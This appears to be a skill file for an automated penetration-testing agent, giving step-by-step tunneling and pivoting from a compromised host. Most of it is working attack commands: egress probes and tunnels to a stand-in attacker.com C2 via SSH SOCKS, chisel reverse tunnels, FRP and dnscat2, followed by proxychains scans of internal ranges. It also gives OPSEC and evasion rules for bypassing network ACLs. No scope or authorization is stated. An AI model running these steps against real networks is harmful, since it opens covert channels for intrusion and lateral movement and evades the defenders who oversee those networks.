---
name: tunneling-pivoting
description: "Trigger: tunneling, pivoting, SOCKS proxy, SSH tunnel, chisel, frp, network pivot. Advanced tunneling and pivoting through multi-segment networks with protocol encapsulation."
license: Apache-2.0
metadata:
  author: "pentest-orchestrator"
  version: "2.0"
---

## Activation Contract

Load when needing to pivot through segmented networks, tunnel traffic through restrictive egress, bypass network ACLs, or access internal services from a compromised host.

## Hard Rules

- Tunneling tool choice depends on egress protocol — use the tool that matches open outbound ports.
- Chisel (HTTP over SSH), FRP (custom binary), and SSH native are preferred — avoid metasploit for OPSEC.
- All tunneled traffic goes through the compromised host's network — use `anonymity-traffic-blending` for noise.

## Decision Gates

| Egress Available | Tool | Protocol | Encryption |
|-----------------|------|----------|------------|
| SSH (22) | Native SSH Dynamic | SOCKS5 via `-D` | SSH native |
| HTTP/HTTPS (80/443) | Chisel | HTTP(S) tunneling | Configurable |
| DNS (53) | dnscat2 | DNS queries | AES encrypted |
| ICMP | hans/icmptunnel | ICMP echo | Basic XOR |
| WebSocket (80/443) | websocat | WS/WSS tunneling | TLS optional |
| Custom port | FRP (frpc/frps) | TCP multiplex | AES-256 |
| gRPC (443) | grpcurl + proxy | gRPC streaming | TLS native |
| SMB (445) | SMB named pipe | SMB pipe forward | SMB signing |

## Execution Steps

1. **Egress detection**: From compromised host, test outbound connectivity: `curl -I https://attacker.com`, `nc -zv attacker.com 443`, `dig @8.8.8.8 attacker.com`
2. **Tool deployment**:
   - Choose tool matching egress from Decision Gates
   - Upload binary via `wget`, `curl`, `certutil`, or `powershell`
   - Start client on compromised host pointing to attacker C2
3. **SSH native**: `ssh -D 1080 -f -N user@attacker.com` → set proxychains to `socks5 127.0.0.1 1080`
4. **Chisel**: Attacker: `chisel server -p 443 --reverse` → Victim: `chisel client https://attacker.com:443 R:socks`
5. **FRP**: Attacker: `frps -c frps.toml` → Victim: `frpc -c frpc.toml`
6. **DNS tunnel**: Attacker: `ruby dnscat2.rb attacker.com` → Victim: `dnscat2-client --dns=attacker.com`
7. **Route internal network**: `proxychains nmap -sT -Pn 10.0.0.0/24 -p 80,443,22,445,3389` through established tunnel
8. **Port forward specific**: `ssh -L 8080:internal-web:80 user@attacker.com` → access `http://localhost:8080`

## Output Contract

Return:
- **type**: ssh_tunnel | chisel_tunnel | frp_tunnel | dns_tunnel | icmp_tunnel | websocket_tunnel
- **egress_protocol**: HTTP / HTTPS / DNS / ICMP / SSH / SMB / gRPC
- **tunnel_established**: Whether tunnel connected successfully
- **network_access**: Internal networks/segments now reachable
- **speed_test**: Tunnel throughput measurement (fast / medium / slow)
